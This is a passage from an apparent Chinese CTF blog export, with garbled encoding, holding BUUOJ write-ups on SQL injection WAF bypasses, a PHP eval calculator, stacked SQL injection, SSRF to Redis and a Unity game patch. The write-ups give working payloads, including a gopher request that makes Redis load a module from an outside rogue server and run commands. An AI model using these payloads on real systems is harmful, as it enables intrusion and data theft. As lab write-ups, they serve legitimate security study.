&#x2F;select%252f%252a*&#x2F;1,2,3%252f%252a*&#x2F;from%252f%252a*&#x2F;users--e.g.id&#x3D;0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user%0D%0A as a newline&#x3D;&#x3D;&gt;0 div 1 union#foo&#x2F;**&#x2F;barselect#foo1,2,currentInline Commentsid&#x3D;1&#x2F;*!uNIon*&#x2F;SeLeCt+1,2,3-- id&#x3D;&#x2F;*!UnIoN*&#x2F;+&#x2F;*!SeLecT*&#x2F;+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOm&#x2F;*!information_schema*&#x2F;.tables&#x2F;*!WhErE*&#x2F;+&#x2F;*!TaBlE_sChEMa*&#x2F;+like+database()--id&#x3D;1&#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F; æ—¶é—´ç›²æ³¨ sleep benchmark WAF 01 $filter = \"/ |\\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\\||`|&|\".urldecode('%09').\"|\".urldecode(\"%0a\").\"|\".urldecode(\"%0b\").\"|\".urldecode('%0c').\"|\".urldecode('%0d').\"|\".urldecode('%a0').\"/i\";` åˆ©ç”¨position/locateå‡½æ•°ã€‚ 123456789select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;%s&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;S&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;SY&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(position(hex(&#x27;SYN&#x27;)in(hex(passwd)))=1)^&#x27;&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-%d)))=hex(&#x27;%s&#x27;))^&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-1)))=hex(&#x27;S&#x27;))^&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-2)))=hex(&#x27;Y&#x27;))^&#x27;select flag from flag where flag=&#x27;admin&#x27;&lt;(hex(mid((passwd)from(-3)))=hex(&#x27;N&#x27;))^&#x27; 02 $filter = \"/||\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|\\\\b(group_)?concat[\\\\s\\\\/\\\\*]*?\\\\([^\\\\)]+?\\\\)|\\bcase[\\s\\/\\*]*?when[\\s\\/\\*]*?\\([^\\)]+?\\)|load_file\\s*?\\\\()|]*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover)\\\\b|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJ-åˆ·é¢˜-Web-Easy-Calc","slug":"BUUOJ-åˆ·é¢˜-Web-Easy-Calc","date":"2020-07-25T15:18:07.000Z","updated":"2020-08-27T06:50:50.046Z","comments":true,"path":"2020/07/25/BUUOJ-åˆ·é¢˜-Web-Easy-Calc/","link":"","permalink":"http://tiaonmmn.github.io/2020/07/25/BUUOJ-%E5%88%B7%E9%A2%98-Web-Easy-Calc/","excerpt":"","text":"RoarCTFçš„Easy Calcã€‚ åˆæ¥ä¸‡æ¶çš„è®¡ç®—å™¨äº†ã€‚ å¼€é¢˜å°±æ˜¯ä¸ªè¾“å…¥è¡¨è¾¾å¼çš„é¡µé¢ï¼Œæ³¨é‡Šæç¤ºä»–ä¸Šäº†WAFã€‚ä½†æ˜¯æ˜¯ä»€ä¹ˆWAFï¼Œæš‚æ—¶ä¸æ¸…æ¥šã€‚ è¾“å…¥ä¼šAJAXå‘åˆ°calc.phpé‡Œï¼Œæˆ‘ä»¬ç›´æ¥æ‰“å¼€calc.phpå‘ç°ç»™äº†æºç ã€‚ 1234567891011121314151617&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; ä¸å…è®¸ç©ºæ ¼ã€å•åŒå¼•å·ã€åå¼•å·ã€ä¸­æ‹¬å·ã€$ã€^ã€ã€‚ä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬åœ¨numå‚æ•°é‚£é‡Œè¾“å…¥ä»»ä½•å­—æ¯éƒ½ä¼šè¿”å›403ï¼Ÿ403å¾ˆæœ‰æ„æ€ï¼Œcalc.phpè‚¯å®šå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä½†æˆ‘ä»¬è¾“å…¥å­—æ¯åè¿”å›403ï¼Œç»“åˆä¹‹å‰çš„WAFæç¤ºï¼ŒçŒœæµ‹æ˜¯WAFæ‹¦æˆªé€ æˆçš„ã€‚ æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼ŒWAFä¸ä¸€å®šæ˜¯PHPçº§åˆ«çš„WAFï¼ŒApacheä¸Šæä¸ªmodsecurityä¹Ÿå«WAFã€‚è€Œå¦‚æœWAFä¸èƒ½æ­£ç¡®ç†è§£PHPçš„ç‰¹æ€§ï¼Œå°±å¯èƒ½é€ æˆç»•è¿‡ã€‚è¯¦ç»†è¯·å‚è€ƒè¿™ä¸ªã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å°è¯•åœ¨URLé‚£é‡ŒåŠ ä¸ªç©ºæ ¼ç»•è¿‡ï¼Ÿè¾“å…¥? num=aï¼Œå‘ç°æ­£å¸¸è¿”å›äº†aï¼Œé‚£å°±å¥½åŠäº†ã€‚æ„é€ Payloadã€‚ å¯ä»¥ç”¨å°æ‹¬å·ä¸.ï¼Œå°è¯•è¯»ç›®å½•ï¼Œscandiréœ€è¦ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œç”±äºå•åŒå¼•å·è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨chr()ä¸.æ‹¼æ¥ã€‚æäº¤? num=1;scandir(chr(46))ï¼Œæ²¡çœ‹åˆ°flagï¼Œé‚£å°±çœ‹æ ¹ç›®å½•? num=1;scandir(chr(47))ï¼Œå‘ç°æœ‰flagï¼Œè¯»å°±å®Œäº‹äº†ã€‚? num=1;show_source(chr(47).chr(102).chr(108).chr(97).chr(103))ã€‚ flag{b39e2900-9680-4e81-b077-fa1b0fd8fba9}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJåˆ·é¢˜-Web-EasySQL","slug":"BUUOJåˆ·é¢˜-Web-EasySQL","date":"2020-07-24T14:09:56.000Z","updated":"2020-07-24T15:35:39.390Z","comments":true,"path":"2020/07/24/BUUOJåˆ·é¢˜-Web-EasySQL/","link":"","permalink":"http://tiaonmmn.github.io/2020/07/24/BUUOJ%E5%88%B7%E9%A2%98-Web-EasySQL/","excerpt":"","text":"SUCTF 2019 EasySQLã€‚ ç¡®å®Easyï¼ŒFuzzä¸€ä¸‹ï¼ŒæŠ¥é”™æ— æç¤ºï¼Œä¸å‡†å‡ºç°union flag prepareç­‰ä¸œè¥¿ã€‚çªå‘å¥‡æƒ³è¯•äº†ä¸‹;å‘ç°å¯è¡Œã€‚1;show databases;è¿”å›ç»“æœäº†ï¼Œé‚£ä¹ˆå †å æ³¨å…¥å§ã€‚ç„¶è€Œä¸èƒ½prepareä»»æ„æ‰§è¡Œã€‚è¿˜å¾—çŒœè¯­å¥ã€‚ éšæ‰‹è¾“ä¸ª1ï¼Œå‘ç°è¿”å›ç»“æœï¼Œè€Œè¾“0å’Œå­—æ¯çš„æ—¶å€™å°±ä¸è¿”å›äº†ã€‚ä¸èƒ½ä»»æ„æ‰§è¡Œè¯­å¥ï¼Œé‚£ä¹ˆflagè¦åœ¨è¯­å¥ä¸­å‡ºç°ï¼Œå¤§èƒ†çŒœæµ‹è¯­å¥ä¸ºselect $_POST['query']||flag from **ã€‚é‚£ä¹ˆï¼Œç›´æ¥è¾“å…¥*,1ï¼Œä¼šå¯¼è‡´SQLè¯­å¥å˜æˆselect *,1||flag from **ï¼Œ||ä»ä¸ºorçš„ä½œç”¨ï¼Œè¡¨ä¸­æ•°æ®å…¨éƒ¨å¸¦å‡ºæ¥ã€‚ å› ä¸ºè¾“å…¥ä»»ä½•å­—æ¯ä¼šæ— è¿”å›ï¼ŒçŒœåˆ°çš„æœ‰||ï¼Œå› ä¸ºæœ‰å­—æ¯çš„æ—¶å€™ä¼šå½“æˆåˆ—åå¤„ç†ï¼Œä»è€Œè¯­å¥ä¸åˆæ³•ã€‚ æ‰€ä»¥ï¼Œè®©||ä¸å†å½“orçš„ä½œç”¨å¯è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå³å˜æˆselect aa||flag from **==select aaflag from **ã€‚MySQLæœ‰ä¸ªsql_modeå¯ä»¥æ§åˆ¶||çš„è¡Œä¸ºï¼Œä¸ºpipes_as_concatæ—¶å¯ä»¥ä½¿||æˆä¸ºå­—ç¬¦ä¸²è¿æ¥ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æäº¤è¦å˜æˆselect 1;set sql_mode=pipes_as_concat;select 1ï¼ŒSQLè¯­å¥å˜æˆselect 1;set sql_mode=pipes_as_concat;select 1||flag from **ï¼Œåˆæ³•çš„è¯­å¥ã€‚è¿™æ ·å°±å¯ä»¥ å¸¦å‡ºflagã€‚ flag{fec33ca7-9bad-492d-985b-c143d31b7260}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"sql_mode","slug":"sql-mode","permalink":"http://tiaonmmn.github.io/tags/sql-mode/"}]},{"title":"BUUOJåˆ·é¢˜-Web-SSRFMe","slug":"BUUOJåˆ·é¢˜-Web-SSRFMe","date":"2020-07-15T16:42:25.000Z","updated":"2020-09-01T13:15:00.642Z","comments":true,"path":"2020/07/16/BUUOJåˆ·é¢˜-Web-SSRFMe/","link":"","permalink":"http://tiaonmmn.github.io/2020/07/16/BUUOJ%E5%88%B7%E9%A2%98-Web-SSRFMe/","excerpt":"","text":"2020å¹´ç½‘é¼æ¯ç„æ­¦ç»„çš„SSRFMeã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpfunction check_inner_ip($url)&#123; $match_result=preg_match(&#x27;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#x27;,$url); if (!$match_result) &#123; die(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die(&#x27;url fomat error&#x27;); return false; &#125; $hostname=$url_parse[&#x27;host&#x27;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;&#125;function safe_request_url($url)&#123; if (check_inner_ip($url)) &#123; echo $url.&#x27; is inner ip&#x27;; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info[&#x27;redirect_url&#x27;]) &#123; safe_request_url($result_info[&#x27;redirect_url&#x27;]); &#125; curl_close($ch); var_dump($output); &#125;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; if(!empty($url))&#123; safe_request_url($url); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;// Please visit hint.php locally.?&gt; å¾ˆæ˜æ˜¾ï¼ŒSSRFï¼Œè¿˜æ¶‰åŠparse_urlå’Œcurlçš„é—®é¢˜ã€‚å…ˆçœ‹check_inner_ipã€‚åè®®è¦http https pogher dictï¼Œç„¶åç”¨parse_urlå¾—åˆ°hostï¼ŒgethostbynameæŠŠåŸŸåè½¬æˆIPã€‚ç„¶åç”¨ip2longåˆ¤æ–­IPæ˜¯å¦å±äº127.*.*.* 172.16.*.*-172.32.*.* 192.168.*.*èŒƒå›´ï¼Œæ˜¯åˆ™è®¤ä¸ºæ˜¯å†…éƒ¨åœ°å€ã€‚ç„¶è€Œæœ¬åœ°è¦æ±‚ä¸èƒ½æ˜¯æœ¬åœ°IPï¼Œä½†æ˜¯hint.phpåˆè¦æ±‚æ˜¯æœ¬åœ°IPè®¿é—®ã€‚ å¦‚ä½•ç»•è¿‡ï¼Ÿæœ‰ä¸¤ç§æ€è·¯ï¼šä¸€æ˜¯åˆ©ç”¨DNS Rebindingã€‚è®©åŸŸååœ¨check_inner_ipçš„æ—¶å€™ä¸ºå¤–éƒ¨åœ°å€ï¼Œè€Œcurlè¯·æ±‚çš„æ—¶å€™åˆå˜æˆå†…éƒ¨IPã€‚æœ‰å¹³å°å¯ä»¥åšåˆ°ï¼Œä½†æ˜¯ä¼šéšæœºå˜åŒ–ï¼Œè¦å¤šæ‰“å‡ æ¬¡ã€‚äºŒæ˜¯åˆ©ç”¨ä¸€ä¸ªç‰¹æ®ŠIPï¼š0.0.0.0ã€‚è¿™ä¸ªIPåœ¨é…æœåŠ¡çš„æ—¶å€™åº”è¯¥è§è¿‡ã€‚åœ¨æœåŠ¡ç«¯è¢«è§†ä¸ºä»»æ„IPåœ°å€ï¼ŒåŒ…æ‹¬æœåŠ¡è‡ªèº«çš„åœ°å€ã€‚å› æ­¤æˆ‘ä»¬æŠŠIPè®¾æˆ0.0.0.0å°±å¯ä»¥äº†ã€‚ ç›´æ¥è®¿é—®http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=http://0.0.0.0/hint.phpã€‚å¾—åˆ°hint.phpå†…å®¹ï¼š 123456789&lt;?phpif($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123; highlight_file(__FILE__);&#125;if(isset($_POST[&#x27;file&#x27;]))&#123; file_put_contents($_POST[&#x27;file&#x27;],&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;.$_POST[&#x27;file&#x27;]);&#125; å†…ç½‘Redisï¼ŒGopheråè®®ã€‚å¯¹ä»˜Redisï¼Œä¸€èˆ¬å‡ ç§æ–¹å‘ï¼šå†™sshå¯†é’¥ï¼Œå†™crontabï¼Œå†™Shellï¼Œä»¥åŠæœ€æ–°çˆ†å‡ºæ¥çš„ä¸»ä»å¤åˆ¶ã€‚å…ˆè¯•ä¸€ä¸‹å†™æ–‡ä»¶ï¼ŒGopherçš„payloadæœ‰ç‚¹é•¿ï¼Œä¸æƒ³æ‰‹åŠ¨æŠ“åŒ…ï¼Œç›´æ¥ç”¨å·¥å…·ã€‚å‘ç°ssh crontab shelléƒ½å¤±è´¥äº†ï¼Œåªèƒ½ä¸»ä»å¤åˆ¶äº†ã€‚ è¿™æ¬¡è¦ç”¨åˆ°è¿™ä¸ªçš„exp.soå’Œè¿™ä¸ªã€‚BUUç¯å¢ƒä¸‹æˆ‘ä»¬è¿˜éœ€è¦ä¸€å°é¶æœºå½“Rogue Serverã€‚ä¿®æ”¹ssrf-redis.pyï¼Œæ”¹ä¸€ä¸‹IPåœ°å€å’Œå‘½ä»¤ï¼Œé…å¥—çš„rogue-server.pyé»˜è®¤ç›‘å¬6666ç«¯å£ï¼Œå°±ä¸æ”¹äº†ï¼Œç„¶åè¿è¡Œç”Ÿæˆpayloadã€‚æ³¨æ„ç”±äºè¦è¿‡curlï¼Œéœ€è¦äºŒæ¬¡URLç¼–ç ã€‚ ç„¶åè®¿é—®http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/%5f%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%32%25%30%44%25%30%41%31%37%34%2e%32%2e%37%32%2e%31%33%35%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41å³å¯ã€‚æ³¨æ„è¦å…ˆè®¿é—®ä¸€éè¿›è¡ŒåŒæ­¥ï¼Œç„¶åæ‰å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚ç”±äºrogue-server.pyä¸ç­‰å¾…åŒæ­¥å®Œæˆå°±é€€å‡ºï¼Œå¯èƒ½é€ æˆexp.soæ²¡æœ‰ä¼ å®Œå°±ç»“æŸäº†ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªæ­»å¾ªç¯åå¤æ‰§è¡Œã€‚ https://lock.cmpxchg8b.com/rebinder.html flag{e7cfe6b7-db69-4a88-8889-fa7fc11e538c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Redis","slug":"Redis","permalink":"http://tiaonmmn.github.io/tags/Redis/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"}]},{"title":"BUUOJåˆ·é¢˜-Misc-Mine-Sweeping","slug":"BUUOJåˆ·é¢˜-Misc-Mine-Sweeping","date":"2020-06-02T12:11:36.000Z","updated":"2020-06-02T14:01:04.158Z","comments":true,"path":"2020/06/02/BUUOJåˆ·é¢˜-Misc-Mine-Sweeping/","link":"","permalink":"http://tiaonmmn.github.io/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/","excerpt":"","text":"De1CTF 2019çš„Mine Sweepingï¼Œä½ ç¡®å®šè¿™ä¸æ˜¯é“Reverse? Unityæ¸¸æˆï¼Œç›´æ¥æ‰¾Dataç›®å½•ä¸‹çš„Managedçš„DLLæ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸ªAssembly-CSharp.dllï¼Œåº”è¯¥å°±æ˜¯æ ¸å¿ƒä»£ç äº†ã€‚ æ‹–åˆ°dotPeeké‡Œï¼Œé¡ºåˆ©åç¼–è¯‘ï¼Œç„¶åç›´æ¥Export to projectï¼ŒVSæ”¹ä»£ç ä¸é¦™ä¹ˆï¼Ÿ å¯¼å‡ºæ¥3ä¸ªæ–‡ä»¶ï¼ŒGrid.csé‡ŒåŒ…å«GameWin()å’ŒGameLose()æ–¹æ³•ï¼Œè€ŒElement.csé‡Œçš„OnMouseUpAsButton()åŒ…å«æœ‰\"game over:lose\"ç­‰å…³é”®å­—ç¬¦ä¸²ã€‚ è¿™é“é¢˜æœ‰å¾ˆå¤šç§è§£æ³•ï¼š 1 Patch ç ”ç©¶OnMouseUpAsButton()æ–¹æ³•ï¼š 12345678910111213141516171819202122232425private void OnMouseUpAsButton()&#123; if (Grids._instance.bGameEnd || this.bIsOpen) return; this.bIsOpen = true; int x = (int)this.transform.position.x; int y = (int)this.transform.position.y; if (this.bIsMine) &#123; this.SafeAndThunder(0); Grids._instance.bGameEnd = true; Grids._instance.GameLose(); MonoBehaviour.print((object)&quot;game over: lose&quot;); &#125; else &#123; this.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y)); Grids._instance.Flush(x, y, new bool[29, 29]); &#125; if (!Grids._instance.GameWin()) return; Grids._instance.bGameEnd = true; MonoBehaviour.print((object)&quot;game over: win&quot;);&#125; å¾ˆæ˜æ˜¾çš„ï¼Œå¦‚æœbIsMineä¸ºçœŸï¼Œæ‰§è¡ŒGameLose()æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬æ³¨é‡Šæ‰ä¸‰è¡Œï¼Œå˜æˆè¿™æ ·ï¼š 12345678910111213141516171819202122232425private void OnMouseUpAsButton()&#123; if (Grids._instance.bGameEnd || this.bIsOpen) return; this.bIsOpen = true; int x = (int)this.transform.position.x; int y = (int)this.transform.position.y; if (this.bIsMine) &#123; this.SafeAndThunder(0); //Grids._instance.bGameEnd = true; //Grids._instance.GameLose(); //MonoBehaviour.print((object)&quot;game over: lose&quot;); &#125; else &#123; this.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y)); Grids._instance.Flush(x, y, new bool[29, 29]); &#125; if (!Grids._instance.GameWin()) return; Grids._instance.bGameEnd = true; MonoBehaviour.print((object)&quot;game over: win&quot;);&#125; è¿™æ ·å°±ç®—è¸©é›·ä¹Ÿä¸ä¼šGame Overäº†ã€‚ç„¶åæˆ‘ä»¬å‘ç°ç¿»äº†æ•´ä¸ªä»£ç ä¹Ÿæ²¡æœ‰å‘ç°ShowImageä¹‹ç±»çš„è°ƒç”¨ï¼Œé‚£ä¹ˆçŒœä¸€ä¸‹è¿™ä¸ª29*29çš„æ–¹å—ä¼šä¸ä¼šæ˜¯æŸç§äºŒç»´ç è¡¨ç°å½¢å¼ã€‚ æ³¨æ„åˆ°åœ¨åˆ¤æ–­bIsMineçš„æ—¶å€™ifå’Œelseä»£ç å—éƒ½è°ƒç”¨äº†SafeAndThunder() 1234567public void SafeAndThunder(int adjcent) &#123; if (this.bIsMine) this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Thor; else this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Athene[adjcent]; &#125; ä¸æ˜¯å¾ˆç†ŸUnityï¼Œç›®æµ‹æ˜¯æŸç§æ¨¡å‹ï¼Ÿæˆ‘ä»¬å°è¯•æŠŠifå’Œelseè°ƒæ¢åç¼–è¯‘æ›¿æ¢Assembly-CSharp.dllæ–‡ä»¶ï¼Œå‘ç°æ•°å­—å’Œé›·çš„å›¾æ ‡å¯¹è°ƒäº†ï¼Œè¯å®äº†æˆ‘ä»¬çš„çŒœæµ‹ã€‚ ç„¶åå°±å‘ç°äº†ä¸‹é¢çš„DawnsLight() 123456&#123; if (this.bIsMine) this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Hodur; else this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Baldr;&#125; åŒæ ·çš„æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°Baldrå¯¹åº”ç™½è‰²ï¼ŒHodurå¯¹åº”é»‘è‰²ã€‚å¾ˆæ˜æ˜¾äº†ï¼ŒäºŒç»´ç ã€‚ ä¸‹é¢æˆ‘ä»¬è¦è®©å®ƒæ˜¾ç¤ºå‡ºæ¥ã€‚DawnsLight()å‡½æ•°æœ‰ä¸€æ¬¡è°ƒç”¨ï¼Œåœ¨Grids.csé‡Œçš„GameWin() 123456789101112131415161718192021222324public bool GameWin()&#123; Elements[,] eleGrids1 = this.eleGrids; int upperBound1 = eleGrids1.GetUpperBound(0); int upperBound2 = eleGrids1.GetUpperBound(1); for (int lowerBound1 = eleGrids1.GetLowerBound(0); lowerBound1 &lt;= upperBound1; ++lowerBound1) &#123; for (int lowerBound2 = eleGrids1.GetLowerBound(1); lowerBound2 &lt;= upperBound2; ++lowerBound2) &#123; Elements elements = eleGrids1[lowerBound1, lowerBound2]; if (!elements.bIsOpen &amp;&amp; !elements.bIsMine) return false; &#125; &#125; Elements[,] eleGrids2 = this.eleGrids; int upperBound3 = eleGrids2.GetUpperBound(0); int upperBound4 = eleGrids2.GetUpperBound(1); for (int lowerBound1 = eleGrids2.GetLowerBound(0); lowerBound1 &lt;= upperBound3; ++lowerBound1) &#123; for (int lowerBound2 = eleGrids2.GetLowerBound(1); lowerBound2 &lt;= upperBound4; ++lowerBound2) eleGrids2[lowerBound1, lowerBound2].DawnsLight(); &#125; return true;&#125; æˆ‘ä»¬æŠŠé‚£ä¸ªreturn falseä»¥åŠä¸Šé¢çš„ifæ³¨é‡Šæ‰ï¼ŒDawnsLight()ä¼šç›´æ¥æ‰§è¡Œã€‚ ç¼–è¯‘åæ›¿æ¢æ–‡ä»¶æ‰§è¡Œåï¼Œç‚¹å‡»å°±ä¼šæ˜¾ç¤ºäºŒç»´ç ã€‚ æ‰«å°±è¡Œäº†ã€‚ flag{269bc18b-081d-49e7-b0b2-2c0847e6edf8}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"}]},{"title":"BUUOJåˆ·é¢˜-TimeTravel","slug":"BUUOJåˆ·é¢˜-Web-TimeTravel","date":"2020-06-01T01:02:27.000Z","updated":"2020-06-01T01:35:51.951Z","comments":true,"path":"2020/06/01/BUUOJåˆ·é¢˜-Web-TimeTravel/","link":"","permalink":"http://tiaonmmn.github.io/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/","excerpt":"","text":"V&amp;N 2020å…¬å¼€èµ›çš„TimeTravelã€‚ 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);require __DIR__ . &#x27;/vendor/autoload.php&#x27;;use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET[&#x27;flag&#x27;])) &#123; $client = new Client(); $response = $client-&gt;get(&#x27;http://127.0.0.1:5000/api/eligible&#x27;); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data[&#x27;success&#x27;] === true) &#123; echo system(&#x27;/readflag&#x27;); &#125;&#125;if(isset($_GET[&#x27;file&#x27;])) &#123; highlight_file($_GET[&#x27;file&#x27;]);&#125;if(isset($_GET[&#x27;phpinfo&#x27;])) &#123; phpinfo();&#125; ç”¨åˆ°äº†GuzzleHttpï¼Œæ˜¯ä¸ªHTTPåº“æ¥ç€ã€‚å¦‚æœGETä¼ å…¥flagï¼Œä¼šè®¿é—®127.0.0.1:5000/api/eligibleï¼Œè¿”å›çš„JSONæœ‰{\"success\":true}å°±è¯»flagã€‚GETä¼ å…¥fileä¼šä»»æ„è¯»æ–‡ä»¶ï¼ŒGETä¼ å…¥phpinfoè¿”å›phpinfo()ç»“æœã€‚ 